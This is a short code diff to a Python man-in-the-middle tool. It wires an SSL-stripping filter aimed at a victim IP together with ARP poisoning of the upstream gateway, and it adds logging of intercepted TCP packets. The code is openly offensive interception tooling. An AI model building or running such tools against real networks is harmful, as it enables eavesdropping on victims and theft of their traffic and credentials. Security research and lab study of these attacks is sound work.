@@ -44,7 +44,7 @@ class MitmHandler:
         self.running = False
         self.logger = logger
         self.filters = []
-        self.add_filter(SSLStripFilter(self.victim_ip, self.logger))
+        self.add_filter(SSLStripFilter(self.victim_ip, self.logger, self.upstream_ip))
         
         # Initialize ARP Poisoner to spoof upstream
         self.arp_poisoner = ARPPoisoner(
@@ -114,6 +114,10 @@ class MitmHandler:
         if packet.haslayer(Ether) and packet[Ether].src == self.attacker_mac:
             return
         
+        # DEBUG: See what we are catching
+        if packet.haslayer(TCP):
+             self.logger(f"[SNIFFER] TCP Packet {packet[IP].src} -> {packet[IP].dst} Dport={packet[TCP].dport}")
+
         # Listen for request from client
         if packet.haslayer(TCP) and packet[TCP].flags == 'S' and packet[IP].src == self.victim_ip:
             self.logger(f"Received connection request from client {self.victim_ip} to {packet[IP].dst}")
